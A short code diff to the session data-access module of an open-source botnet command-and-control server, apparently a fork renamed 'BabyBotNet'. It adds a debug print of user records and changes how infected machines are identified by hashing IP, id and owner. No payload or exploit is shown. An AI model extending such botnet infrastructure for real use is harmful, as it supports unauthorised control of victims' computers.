@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'DAO (Build Your Own Botnet)'
+'DAO (BabyBotNet)'
 
 # standard library
 import os
@@ -84,6 +84,7 @@ class SessionDAO:
         :param int user_id:     User ID
         """
         user = self.user_dao.get_user(user_id=user_id)
+        print("DEBUG user =====================================>", user)
         new_sessions = []
         if user:
             sessions = user.sessions
@@ -106,7 +107,7 @@ class SessionDAO:
         # assign new session UID
         if not session_dict.get('uid'):
             # use unique hash of session characteristics to identify machine if possible
-            identity = str(session_dict['public_ip'] + session_dict['mac_address'] + session_dict['owner']).encode()
+            identity = str(session_dict['public_ip'] + session_dict['id'] + session_dict['owner']).encode()
             session_dict['uid'] = hashlib.md5(identity).hexdigest()
             session_dict['joined'] = datetime.utcnow()
 
